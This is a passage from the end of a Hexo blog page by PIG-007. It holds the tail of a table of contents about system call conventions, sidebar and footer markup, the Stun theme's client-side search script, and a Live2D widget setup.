          6.系统调用使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BC%A0%E5%8F%82%E7%BA%A6%E5%AE%9A"><span class="toc-text">
          (1)传参约定</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">119</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">63</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">61</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>